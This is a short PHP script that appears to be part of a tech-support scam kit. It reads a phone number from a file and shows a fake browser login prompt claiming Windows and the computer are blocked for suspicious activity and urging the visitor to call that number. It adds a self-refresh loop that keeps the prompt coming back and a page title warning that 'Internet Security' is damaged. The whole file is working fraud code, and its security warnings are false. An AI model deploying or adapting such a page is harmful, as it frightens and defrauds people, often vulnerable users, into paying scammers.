<?php
$myfile = fopen("../number.txt", "r") or die("Unable to open file!");
$phone = fgets($myfile);
//
$phone = trim(preg_replace('/\s\s+/', ' ', $phone));
fclose($myfile);


header('WWW-Authenticate: Basic realm="Windows and computer has been blocked due to some suspicious activity, to get your computer secure call us immediately on our number: '.$phone.' "');
header('Location: auth.php');
header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
$sec = "0";
header("Refresh: $sec; url=$page");
echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";
?>
